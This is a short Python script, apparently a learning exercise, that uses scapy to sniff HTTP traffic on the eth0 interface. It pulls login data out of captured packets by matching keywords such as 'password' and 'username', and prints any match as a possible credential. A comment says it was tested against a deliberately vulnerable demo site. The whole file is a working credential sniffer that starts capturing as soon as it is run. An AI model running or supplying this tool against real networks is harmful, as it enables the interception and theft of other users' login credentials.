import scapy.all as scapy
from scapy.layers import http

# Tested website: http://testhtml5.vulnweb.com
# Funtion to sniff packets in the network using the library scapy
def sniff_network(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_network)

# Function to get login information
def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["login", "password", "pass", "username", "user", "user name", "mailname", "name", "log-in"]
        for keyword in keywords:
            if keyword in load:
                return load

# This function process all the information sniffed from the network traffic
def process_sniffed_network(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("### HTTP Request --> " + str(url))
        login_info = get_login(packet)
        if login_info:
            print("\n\n ### Possible username/password --> " + login_info + "\n\n")

sniff_network("eth0")